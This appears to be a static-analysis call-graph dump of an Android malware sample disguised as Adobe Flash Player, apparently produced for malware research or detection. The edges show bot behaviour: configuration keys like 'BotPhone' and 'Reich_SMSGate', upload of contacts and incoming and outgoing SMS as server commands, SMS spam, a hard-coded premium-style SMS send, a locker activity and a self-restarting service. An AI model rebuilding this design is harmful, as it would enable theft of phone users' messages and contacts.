VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=contacts&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>("79262000900", "HELP") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r34 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r13.<java.lang.String: boolean contains(java.lang.CharSequence)>("nodata") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotVer", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getContacts:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "sentSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
CLINIT edge: staticinvoke <java.io.File: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.io.File: void <clinit>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.ComponentName startService(android.content.Intent)>($r3) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: void <init>()>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r8 = interfaceinvoke r5.<java.util.Map: java.lang.Object get(java.lang.Object)>($r44) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("connectivity") in <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void <init>()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>(r0, 90000L, 10L) in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void stopSelf()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void stopSelf()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void startActivityForResult(android.content.Intent,int)>(r2, 1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void startActivityForResult(android.content.Intent,int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rDate: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
CLINIT edge: staticinvoke <android.os.Build$VERSION: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.Build$VERSION: void <clinit>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
